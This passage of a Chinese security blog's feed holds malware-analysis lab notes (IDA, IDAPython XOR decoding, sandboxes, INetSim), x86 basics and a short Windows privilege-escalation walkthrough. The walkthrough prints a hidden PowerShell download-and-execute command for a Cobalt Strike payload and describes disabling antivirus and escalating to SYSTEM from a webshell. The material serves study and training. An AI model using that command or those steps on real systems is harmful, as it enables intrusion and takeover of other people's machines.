20h<br>.data:1001D98E                 db  69h ; i<br>.data:1001D98F                 db  73h ; s<br>.data:1001D990                 db  20h<br>.data:1001D991                 db  74h ; t<br>.data:1001D992                 db  68h ; h<br>.data:1001D993                 db  69h ; i<br>.data:1001D994                 db  73h ; s<br>.data:1001D995                 db  20h<br>.data:1001D996                 db  62h ; b<br>.data:1001D997                 db  61h ; a<br>.data:1001D998                 db  63h ; c<br>.data:1001D999                 db  6Bh ; k<br>.data:1001D99A                 db  64h ; d<br>.data:1001D99B                 db  6Fh ; o<br>.data:1001D99C                 db  6Fh ; o<br>.data:1001D99D                 db  72h ; r<br>.data:1001D99E                 db  2Ch ; ,<br>.data:1001D99F                 db  20h<br>.data:1001D9A0                 db  73h ; s<br>.data:1001D9A1                 db  74h ; t<br>.data:1001D9A2                 db  72h ; r<br>.data:1001D9A3                 db  69h ; i<br>.data:1001D9A4                 db  6Eh ; n<br>.data:1001D9A5                 db  67h ; g<br>.data:1001D9A6                 db  20h<br>.data:1001D9A7                 db  64h ; d<br>.data:1001D9A8                 db  65h ; e<br>.data:1001D9A9                 db  63h ; c<br>.data:1001D9AA                 db  6Fh ; o<br>.data:1001D9AB                 db  64h ; d<br>.data:1001D9AC                 db  65h ; e<br>.data:1001D9AD                 db  64h ; d<br>.data:1001D9AE                 db  20h<br>.data:1001D9AF                 db  66h ; f<br>.data:1001D9B0                 db  6Fh ; o<br>.data:1001D9B1                 db  72h ; r<br>.data:1001D9B2                 db  20h<br>.data:1001D9B3                 db  50h ; P<br>.data:1001D9B4                 db  72h ; r<br>.data:1001D9B5                 db  61h ; a<br>.data:1001D9B6                 db  63h ; c<br>.data:1001D9B7                 db  74h ; t<br>.data:1001D9B8                 db  69h ; i<br>.data:1001D9B9                 db  63h ; c<br>.data:1001D9BA                 db  61h ; a<br>.data:1001D9BB                 db  6Ch ; l<br>.data:1001D9BC                 db  20h<br>.data:1001D9BD                 db  4Dh ; M<br>.data:1001D9BE                 db  61h ; a<br>.data:1001D9BF                 db  6Ch ; l<br>.data:1001D9C0                 db  77h ; w<br>.data:1001D9C1                 db  61h ; a<br>.data:1001D9C2                 db  72h ; r<br>.data:1001D9C3                 db  65h ; e<br>.data:1001D9C4                 db  20h<br>.data:1001D9C5                 db  41h ; A<br>.data:1001D9C6                 db  6Eh ; n<br>.data:1001D9C7                 db  61h ; a<br>.data:1001D9C8                 db  6Ch ; l<br>.data:1001D9C9                 db  79h ; y<br>.data:1001D9CA                 db  73h ; s<br>.data:1001D9CB                 db  69h ; i<br>.data:1001D9CC                 db  73h ; s<br>.data:1001D9CD                 db  20h<br>.data:1001D9CE                 db  4Ch ; L<br>.data:1001D9CF                 db  61h ; a<br>.data:1001D9D0                 db  62h ; b<br>.data:1001D9D1                 db  20h<br>.data:1001D9D2                 db  3Ah ; :<br>.data:1001D9D3                 db  29h ; )<br>.data:1001D9D4                 db  31h ; 1<br>.data:1001D9D5                 db  32h ; 2<br>.data:1001D9D6                 db  33h ; 3<br>.data:1001D9D7                 db  34h ; 4<br></code></pre></td></tr></table></figure><p>以上字符串如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">xdoor <span class="hljs-keyword">is</span> <span class="hljs-keyword">this</span> backdoor <span class="hljs-built_in">string</span> decoded <span class="hljs-keyword">for</span> Practical Malware Analysis Lab :)<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p><strong>20.将光标放在同一位置，你如何将这个数据转成一个单一的ASCII字符串？</strong></p><p>在同一位置点击A键可以自动将这串字符串提取出来：</p><p><img src="https://i.loli.net/2019/03/05/5c7e6d5578066.png"></p><p><strong>21.使用一个文本编辑器打开这个脚本，它是如何工作的？</strong></p><p>Lab05-01.py内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">sea = ScreenEA()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>,<span class="hljs-number">0x50</span>):<br>        b = Byte(sea+i)<br>        decoded_byte = b ^ <span class="hljs-number">0x55</span><br>        PatchByte(sea+i,decoded_byte)<br></code></pre></td></tr></table></figure><p>这个脚本先获取光标所在位置的第一个数据，将第一个数据后的50h的数据与0x55作与运算，再将运算结果替换掉原来的数据。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>IDA Pro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态分析高级技术</title>
    <link href="/2019/03/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/03/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本章内容为静态分析高级技术，知识点内容较多，很多知识点都是与x86体系结构下的指令等相关知识。</p><p><strong>微指令|机器码：</strong>微指令层又称为固件，微指令只能在特定的电路上执行，其通常由更高的机器码层翻译而来，提供了访问硬件的接口；机器码层由操作码组成，操作吗是一些十六进制的数字，机器码一般由多条微指令实现，用于告诉底层硬件如何执行实际的代码。</p><p><strong>逆向工程：</strong>逆向工程是将程序的二进制文件作为输入，由反汇编软件将其输出为汇编语言再进行分析的过程，汇编语言是一类语言的统称，例如x86、x64、SPARC、PowerPC、MIPS、ARM等。</p><span id="more"></span><p><strong>内存：</strong></p><p>一个程序的内存可以分为一下四个主要部分</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+------------------------+<br>低内存地址|<span class="hljs-string">          栈            </span>|<span class="hljs-string">  用于函数的局部变量及参数，以及控制程序执行流</span><br><span class="hljs-string">+------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">          堆            </span>|<span class="hljs-string">  堆是为程序执行期间需要的动态内存准备的</span><br><span class="hljs-string">+------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                        </span>|<br>|<span class="hljs-string">          代码          </span>|<span class="hljs-string">  包含在执行程序代码时CPU执行的指令</span><br><span class="hljs-string"></span>|<span class="hljs-string">                        </span>|<br>+------------------------+<br>高内存地址|<span class="hljs-string">          数据          </span>|<span class="hljs-string">  程序运行时的静态值，程序运行时不会发生变化</span><br><span class="hljs-string">+------------------------+</span><br></code></pre></td></tr></table></figure><p><strong>指令：</strong>指令时汇编程序的构成块，格式如下：</p><table><thead><tr><th>助记符</th><th>目标操作数</th><th>源操作数</th></tr></thead><tbody><tr><td>mov</td><td>ecx</td><td>0x42</td></tr></tbody></table><p><strong>操作码|字节序：</strong>每条指令使用操作码<code>opcode</code>告诉CPU执行什么样的操作，反汇编器将操作码翻译为人类易读的指令，如下对比：</p><table><thead><tr><th>指令</th><th>mov ecx</th><th>0x42</th></tr></thead><tbody><tr><td>操作码</td><td>B9</td><td>42 00 00 00</td></tr></tbody></table><p><strong>大端序|小端序：</strong><code>x86</code>架构使用小端字节序。数据的字节序指的是在一个数据项中，最高位（大端）还是最低位（小端）被排在第一位，一些恶意代码必须在网络通信时改变字节序，因为网络数据使用大端序，而<code>x86</code>程序使用小端序，再大端序下，网络地址<code>127.0.0.1</code>被表示为<code>0x7f000001</code>，而在小端序下表示为<code>0x1000007f</code>。</p><p><strong>操作数：</strong>操作数说明指令要使用的数据，有以下三种类型：</p><ul><li>立即数：操作数是一个固定的值。</li><li>寄存器：操作数指向寄存器。</li><li>内存地址：操作数指向一个内存地址，一般由方括号内包含值、寄存器或方程式组成，如<code>[eax]</code></li></ul><p><strong>寄存器：</strong>寄存器是可以被CPU使用的少量数据存储器，访问速度极快，寄存器分为以下四类：</p><ul><li>通用寄存器，在CPU执行期间使用</li><li>段寄存器，用于定位内存节</li><li>状态标志，用于做出决定</li><li>指令指针，用于定位下一条要执行的指令</li></ul><p>在x86环境下，这些寄存器的大小都为32位，有四个写寄存器可以以8位值的方式引用，应用示例如下：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">                              EAX<br>32bits  ================================================<br>        |1010 <span class="hljs-number"> 1001 </span><span class="hljs-number"> 1101 </span><span class="hljs-number"> 1100 </span><span class="hljs-number"> 1000 </span><span class="hljs-number"> 0001 </span><span class="hljs-number"> 1111 </span> 0101|<br>        | A    <span class="hljs-number"> 9 </span>     D     C    <span class="hljs-number"> 8 </span>   <span class="hljs-number"> 1 </span>   F     <span class="hljs-number"> 5 </span>|<br>        ================================================<br>        <br>                                           AX<br>                         16bits ========================<br>                                |1000 <span class="hljs-number"> 0001 </span><span class="hljs-number"> 1111 </span> 0101|<br>                                | <span class="hljs-number"> 8 </span>   <span class="hljs-number"> 1 </span>   F     <span class="hljs-number"> 5 </span>|<br>                                ========================<br>                                <br>                                     AH           AL<br>                          8bits ============ ============<br>                                |1000  0001| |1111  0101|<br>                                | <span class="hljs-number"> 8 </span>   <span class="hljs-number"> 1 </span>| | F     <span class="hljs-number"> 5 </span>|<br>                                ============ ============<br>                                      <br></code></pre></td></tr></table></figure><p><strong>通用寄存器：</strong>通用寄存器一般用于存储数据或者地址，但是一些寄存器并不通用，如乘法和除法指令只使用<code>EAX</code>和<code>EDX</code>，而<code>EAX</code>一般也会作为存储程序返回值的寄存器。</p><p><strong>标志寄存器：</strong>EFLAGES是一个标志寄存器，在x86架构中，他是32位的，每一位是一个标志，在运行时每一位要不么置位，要么清零，常见的标志如下：</p><ul><li>ZF：当一个运算结果等于0时，ZF为1，否则为0</li><li>CF：当一个运算的结果相对于目标操作数太大或太小时，CF为1，否则为0</li><li>SF：当一个运算的结果为负数，SF为1，否则为0，且当运算结果的最高位为1，SF也为1</li><li>TF：TF用于调试，当TF为1时，x86处理器每次只执行一条指令</li></ul><p><strong>EIP：</strong>EIP寄存器保存了程序将要执行的下一条指令的地址。、</p><p><strong>NOP指令：</strong><code>nop</code>指令即空指令，实际上此指令是<code>xchg eax</code>的一个伪名。</p><p><strong>栈：</strong>用于函数的内存，局部变量，流程控制结构等存储在栈中，栈智能用于短期存储，其主要用途是管理函数调用之间的数据交换。不同的编译器对这种管理方法实现的方式有所不同，但是大部分常见约定都使用相对EBP的地址来引用局部变量和参数。</p><p><strong>函数调用：</strong>在函数调用时，最常见的调用方式是<code>cdecl</code>，调用函数的流程一般如下：</p><ol><li>使用push将参数压入栈中</li><li>使用call memory_location来调用函数，当前指令地址被压入栈中</li><li>分配空间给局部变量，同时基地址EBP也被压入栈中</li><li>函数工作</li><li>恢复栈，调整ESP来释放局部变量占用的空间，从栈中弹出EBP</li><li>函数通过ret指令返回，从栈中弹出先前存储的EIP中的值给EIP，程序从原来调用的地方继续执行</li><li>调整栈，以移除之前压入的参数</li></ol><p><strong>汇编指令：</strong>常见的汇编指令数量较多，可从网上参阅。</p><p><strong>C语言主函数和主函数参数：</strong>一个标准的C程序的主函数通常有两个参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br></code></pre></td></tr></table></figure><p>参数<code>argc</code>和<code>argv</code>在运行时决定。其中参数<code>argc</code>是一个整数，说明了命令行中参数的个数。参数<code>argv</code>是一个字符串数据指针，指向了所有命令行参数。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><p>本章无课后练习。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>静态分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权实战</title>
    <link href="/2019/02/Windows%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98/"/>
    <url>/2019/02/Windows%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p>前提已经拿到了一个webshell</p><span id="more"></span><p><img src="https://i.loli.net/2021/02/11/slC7tkihON2MPRq.png" alt="蚁剑的shell"></p><p>使用CS创建一个Listener，并生成攻击payload</p><p><img src="https://i.loli.net/2021/02/11/r7mcflgOY1qLQjB.png" alt="设置"></p><p>点击launch之后会弹出命令<br><img src="https://i.loli.net/2021/02/11/W1zjMk8DZCfyUYO.png" alt="payload"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.211.55.13:8081/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>在蚁剑中执行以上命令发现CS中没有成功上线，看了一眼发现是火绒拦截了</p><p><img src="https://i.loli.net/2021/02/11/BgXARpPTbQztUjY.png" alt="火绒拦截"></p><p>那就把火绒退掉再试一下👻</p><p>成功上线。。。</p><p><img src="https://i.loli.net/2021/02/11/NplcPuy1xg2RDOn.png" alt="上线成功"></p><p>此时使用shell查看权限为普通用户权限</p><p><img src="https://i.loli.net/2021/02/11/EhbVCnFtsqDJdRL.png" alt="普通权限"></p><p>尝试提权，使用CS自带的Windows提权模块进行提权，按照流程创建一个TCP的listener，点击开始之后稍等片刻即可得到一个权限为System的shell。</p><p><img src="https://i.loli.net/2021/02/11/bxgJMCY1VHDfd8L.png" alt="提权"></p><p><img src="https://i.loli.net/2021/02/11/6HWcZO5Isaxle7v.png" alt="提权成功"></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>提权</tag>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态分析基础技术</title>
    <link href="/2019/01/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/01/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>与静态分析不同，动态分析是将恶意代码加载运行之后观察代码运行状态的一个过程，一般来说，对恶意代码进行分析时先进行静态分析来大致了解软件的功能再进行动态分析以了解恶意代码运行时的更多细节，静态分析与动态分析都有各自的有点以及局限性，本章重点介绍了动态分析的一些手法和技巧。</p><p><strong>用沙箱来分析恶意代码：</strong>沙箱是一种在安全环境下运行不信任的程序的安全机制，沙箱一般包含一个虚拟的环境，并可以定制虚拟网络等“欺骗”恶意代码让恶意代码认为自己所在的沙箱是一个正常的物理机的各种虚拟功能，但是运行在沙箱中的恶意代码并不会对物理机产生任何威胁，因此沙箱是一个很好的用来动态分析恶意代码的工具。</p><p>前一段时间我使用过布谷鸟沙箱（<code>Cuckoo</code>），这一款沙箱的结构是首先开启一个安装有<code>Ubuntu14.04</code>的系统用于安装Cuckoo，然后再向这个虚拟机上安装所有<code>Cuckoo</code>依赖的插件，安装完成后再向<code>Ubuntu</code>中安装一个<code>Vmware</code>虚拟机来安装一个用于运行Windows等系统的虚拟机，整体相当于是一个虚拟机的嵌套结构，布谷鸟对这个在虚拟机中运行的虚拟机的运行状态的存储状态进行记录，并对比运行病毒前后的镜像区别来确定恶意代码对主机做了什么，并会生成一个十分详细的报告，总的来说这种杀向在我们对一个恶意代码进行静态分析遇到困难时还是很有帮助的，但是缺点是此系统十分难于安装，因为很多安装条件会产生冲突，而且此沙箱运行起来也是对电脑性能的极大挑战，除非你有一台安装了<code>Ubuntu14.04</code>的物理主机。</p><span id="more"></span><p>类似于这样的沙箱还有<code>Norman</code>、<code>GFI</code>、<code>Anubis</code>、<code>Joe</code>、<code>ThreatExpert</code>、<code>BitBlaze</code>、<code>Comodo</code>等沙箱。</p><p>沙箱的缺点：</p><ul><li>有些恶意代码会检测运行环境是否为虚拟环境，如果是虚拟环境，则恶意代码通常不会表现出真正的功能。</li><li>恶意代码通常会连接C2服务器来执行特定的功能，如果恶意代码设定了一个潜伏期，则沙箱就难以探测到长时间以后恶意代码可能发生的行为。</li><li>沙箱不能很方便的分析一个DLL恶意代码</li></ul><p><strong>运行DLL文件：</strong>如果碰到一个DLL恶意代码，Windows不知道如何运行DLL文件，因此我们需要使用rundll32.exe来运行DLL文件，使用命令格式如下:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">rundll32.exe DLL_name, Export_arguments<br></code></pre></td></tr></table></figure><p><code>Export_arguments</code>必须是DLL文件导出函数的函数名或者是函数序号，使用函数名可以直接将函数名作为<code>Export_arguments</code>参数的值，如果使用函数序号需要写为井号加数字的形式来表示序号如<code>#2</code></p><p>比如使用命令<code>rundll32.exe shell32.dll,RestartDialog</code>可以使计算机弹出重新启动窗口</p><p><strong>进程监视器：</strong>进程监视器是Windows下一款可以监视系统注册表和文件系统，进程和线程的软件，虽然此程序也可以监控网络流量，但是由于Windows不同版本可能存在不同程度的兼容问题，所以一般不采用进程管理器来监控网络行为。另外，进程监视器是使用内存来记录事件的，因此如果你在虚拟环境下调用此程序，每分钟超过5万次的调用行为可能很快就将内存耗尽，因此我们使用进程监视器来监控程序的系统调用时需要清空之前的调用记录并将监控时间缩短以避免内存空间被耗尽。</p><p>可以用进程监视器来分析恶意文档如PDF文档和Word文档，当文档被加载后，可以在进程监视器中看到文档启动的进程并通过Image字段来找到恶意代码在磁盘上的位置。</p><p><strong>RegShot：</strong>Regshot是一款注册表监视器，可以在运行恶意代码之前对注册表做一次快照，再在运行恶意代码之后做一次快照，然后通过对比运行恶意代码前后注册表内容的不同来得知恶意代码对注册表进行了哪些操作。</p><p><strong>网络：</strong>以下是几款模拟网络响应或者监视网络事件的好用软件的软件：</p><ul><li>ApateDNS：此软件是一款免费软件，可以很方便的发现恶意代码进行的DNS请求。</li><li>WireShark：不必多说，神器。</li><li>NetCat：瑞士军刀，神器。</li><li>INetSim：INetSim是一款基于Linux的模拟网络的免费软件他可以模拟多种服务如<code>Http</code>、 <code>Https</code>、<code>FTP</code>、<code>IRC</code>、<code>DNS</code>、<code>SMTP</code>等，而且可以根据恶意代码的请求做出尽量符合恶意代码要求的返回动作从而帮助我们研究恶意代码。</li></ul><p>关于动态分析过程中用的软件，嘶吼上有一篇文章介绍：<a href="http://www.4hou.com/technology/3022.html">http://www.4hou.com/technology/3022.html</a></p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab3-1"><a href="#Lab3-1" class="headerlink" title="Lab3-1"></a>Lab3-1</h3><p><strong>使用动态分析技术来分析在Lab03-01.exe文件中发现的恶意代码</strong></p><p><strong>1.找出这个恶意代码的导入函数与字符串列表</strong>。</p><p>这个恶意代码只有一个导入函数函数，因此判断此程序可能是加了壳的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">00400200ExitProcess   kernel32<br></code></pre></td></tr></table></figure><p>用<code>PEiD</code>查壳发现此程序确实加了壳，壳为<code>PEncrypt 3.1 Final -&gt; junkcode</code>，但此题不需要脱壳。</p><p>字符串列表：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">AddressLengthTypeString<br>.text:0040025A0000000DCkernel32.dll<br>.data:00400EF700000005C\b1\a1G<br>.data:0040108700000007C\n6I*h&lt;8<br>.data:004010A700000010C^-m-m&lt;|&lt;|&lt;|M\rM\r^<br>.data:0040124700000006Cntdll<br>.data:0040125E00000007Cuser32<br>.data:004014F700000008Cadvpack<br>.data:0040162300000008CStubPath<br>.data:0040162F00000029CSOFTWARE\\Classes\\http\\shell\\open\\commandV<br>.data:0040165B00000035CSoftware\\Microsoft\\Active Setup\\Installed Components\\<br>.data:0040169C00000022Cwww.practicalmalwareanalysis.com<br>.data:004016D400000007Cadmin\t\r<br>.data:004016E20000000BCVideoDriver<br>.data:004016F100000009CWinVMX32-<br>.data:004016FD0000000DCvmx32to64.exe<br>.data:0040194300000008CAppData<br></code></pre></td></tr></table></figure><p><strong>2.这个恶意代码在主机上的感染迹象特征是什么？</strong></p><p>此题主要考察的时对应用程序在运行时动态行为的捕捉，打开<code>Procmon</code>捕捉当前所有事件，设置过滤器使得程序显示出与Lab03-01.exe相关的进程活动记录：</p><p><img src="https://i.loli.net/2019/02/01/5c544eafc0bec.png"></p><p>这样初步过滤后可以看到恶意代码的事件数量还是很大，我们可以通过其他过滤器来筛选出自己想看到的结果。</p><p>运行<code>RegShot</code>进行注册表快照时我发现Win10的注册表项目十分庞大，拍摄快照时会有很多干扰项，因此我尝试下载<code>WindowsXP</code>进行实验，幸运的是，在我使用<code>WindowXP</code>作为病毒分析环境时，很快就用<code>RegShot</code>分析出了病毒对注册表的改动：</p><p><img src="https://i.loli.net/2019/03/03/5c7b762d204ec.png"></p><p><strong>3.这个恶意代码是否存在一些有用的网络特征，如果存在，他们是什么？</strong></p><p>在分分析恶意代码中包含的字符串的过程中我们就已经发现了一个敏感的字符串<code>www.practicalmalwareanalysis.com</code>，看到这个网址我们八成就能猜出这个恶意代码很可能会与此域名建立连接。</p><p>使用<code>ApateDNS</code>，过程中发现此程序无法在我的虚拟机中正常启动，因为虚拟机的53端口被其他进程占用了，查看之后发现使<code>svchost</code>，kill掉此进程后<code>ApateDNS</code>即可正常启动</p><p>我们需要运行<code>INetSim</code>来捕捉恶意代码的网络请求</p><p>修改如下几处配置</p><ul><li>修改<code>service_bind_address</code>为安装了<code>INetSim</code>的虚拟机的IP地址：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">#########################################<br># service_bind_address<br>#<br># IP address to bind services to<br>#<br># Syntax: service_bind_address &lt;IP address&gt;<br>#<br># Default: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>#<br>service_bind_address<span class="hljs-number">192.168</span><span class="hljs-number">.60</span><span class="hljs-number">.129</span><br></code></pre></td></tr></table></figure><ul><li>修改<code>dns_default_ip</code>为安装了<code>INetSim</code>的虚拟机的IP地址，以接收DNS请求：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">#########################################<br># service_bind_address<br>#<br># IP address to bind services to<br>#<br># Syntax: service_bind_address &lt;IP address&gt;<br>#<br># Default: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>#<br>service_bind_address<span class="hljs-number">192.168</span><span class="hljs-number">.60</span><span class="hljs-number">.129</span><br></code></pre></td></tr></table></figure><ul><li>接着转到接近配置文件末尾的地方，开启重定向：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">#########################################<br># service_bind_address<br>#<br># IP address to bind services to<br>#<br># Syntax: service_bind_address &lt;IP address&gt;<br>#<br># Default: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>#<br>service_bind_address<span class="hljs-number">192.168</span><span class="hljs-number">.60</span><span class="hljs-number">.129</span><br></code></pre></td></tr></table></figure><ul><li>打开TCP端口用于连接：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">#########################################<br># redirect_exclude_port<br>#<br># Connections to &lt;service_bind_address&gt; on this port<br><span class="hljs-meta"># are not redirected</span><br>#<br># Syntax: redirect_exclude_port &lt;protocol:port&gt;<br>#<br># Default: none<br>#<br>redirect_exclude_porttcp:<span class="hljs-number">22</span><br>#redirect_exclude_portudp:<span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><ul><li>重定向外部地址：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">#########################################<br># redirect_external_address<br>#<br># IP address used as source address <span class="hljs-keyword">if</span> INetSim<br><span class="hljs-meta"># acts as a router for redirecting packets to</span><br><span class="hljs-meta"># external networks.</span><br># This option only takes effect <span class="hljs-keyword">if</span> <span class="hljs-type">static</span> rules<br><span class="hljs-meta"># for redirecting packets to external networks</span><br><span class="hljs-meta"># are defined (see <span class="hljs-string">&#x27;redirect_static_rule&#x27;</span> below).</span><br>#<br># Syntax: redirect_external_address &lt;IP address&gt;<br>#<br># Default: none<br>#<br>redirect_external_address<span class="hljs-number">192.168</span><span class="hljs-number">.60</span><span class="hljs-number">.129</span><br></code></pre></td></tr></table></figure><p>修改完以上内容后重新启动<code>INetSim</code>发现如下报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">* redirect - failed! Error: Sorry, this module requires the Perlipq library (IPTables::IPv4::IPQueue)!<br></code></pre></td></tr></table></figure><p>后来得知<code>InetSim</code>弃用了这个库所以这个功能暂时无法使用，那么就先不用这个了。</p><p>用WireShark抓包看一下发现了一个DNS请求的数据包：</p><p><img src="https://i.loli.net/2019/03/03/5c7b7712d11fb.png"></p><p>恶意代码每30秒就会发送一次对此域名的DNS解析请求，而且会广播一个长度为256字节的随机数据：</p><p><img src="https://i.loli.net/2019/03/03/5c7b78f0de32d.png"></p><p><code>WireShark</code>将此数据包识别为SSL流量，但是看数据包内容可得知这并不是一个SSL数据包，而只是占用了443端口。</p><h3 id="Lab3-2"><a href="#Lab3-2" class="headerlink" title="Lab3-2"></a>Lab3-2</h3><p><strong>使用动态分析技术来分析在Lab03-02exe文件中发现的恶意代码</strong></p><p><strong>1.您怎样才能让这个恶意代码自行安装？</strong></p><p>这个恶意代码是一个DLL程序，因此我们需要用rundll32.exe工具来运行此DLL文件中的函数，先用IDA查看一下此DLL中的函数：</p><p>此程序的导出函数列表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">NameAddressOrdinal<br>Install<span class="hljs-number">10004706</span><span class="hljs-number">1</span><br>ServiceMain<span class="hljs-number">10003196</span><span class="hljs-number">2</span><br>UninstallService<span class="hljs-number">10004B</span>18<span class="hljs-number">3</span><br>installA<span class="hljs-number">10004B</span>0B<span class="hljs-number">4</span><br>uninstallA<span class="hljs-number">10004</span>C2B<span class="hljs-number">5</span><br>DllEntryPoint<span class="hljs-number">10004E4</span>D[main entry]<br></code></pre></td></tr></table></figure><p>导入函数：</p><figure class="highlight 